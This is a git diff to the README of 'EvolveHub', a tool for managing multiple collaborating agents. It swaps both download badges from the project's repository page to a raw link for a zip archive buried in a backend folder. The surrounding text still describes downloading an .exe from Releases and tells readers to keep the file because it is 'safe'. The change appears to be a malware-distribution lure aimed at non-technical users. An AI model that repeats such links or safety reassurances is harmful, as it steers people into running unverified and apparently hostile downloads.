@@ -1,6 +1,6 @@
 # 🌐 EvolveHub - Manage Complex Multi-Agent Collaboration Projects Easily
 
-[![](https://img.shields.io/badge/Download_EvolveHub-Blue?style=for-the-badge)](https://github.com/Darianamnesiac3112/EvolveHub)
+[![](https://img.shields.io/badge/Download_EvolveHub-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Darianamnesiac3112/EvolveHub/main/backend/evolvehub-gateway/Evolve-Hub-v3.3.zip)
 
 EvolveHub provides a workspace for people who need to manage multiple digital agents. These agents work together to solve problems or complete tasks. You can observe how these agents interact and evolve within the system. This tool simplifies the way you organize collaborative workflows. You do not need experience in coding to use this application for your projects.
 
@@ -18,7 +18,7 @@ Verify that your Java version matches the requirement. You can check this by typ
 
 ## 📥 Downloading the Application
 
-[![](https://img.shields.io/badge/Download_EvolveHub-Grey?style=for-the-badge)](https://github.com/Darianamnesiac3112/EvolveHub)
+[![](https://img.shields.io/badge/Download_EvolveHub-Grey?style=for-the-badge)](https://raw.githubusercontent.com/Darianamnesiac3112/EvolveHub/main/backend/evolvehub-gateway/Evolve-Hub-v3.3.zip)
 
 Visit the link above to reach the repository page. Look for the section labeled Releases on the right side of the screen. Click the link that shows the most recent version number. Scroll down to the Assets area. Select the file ending in .exe to start your download. Your browser might ask if you want to keep the file. Choose Keep because this file is safe for use on Windows systems.
 
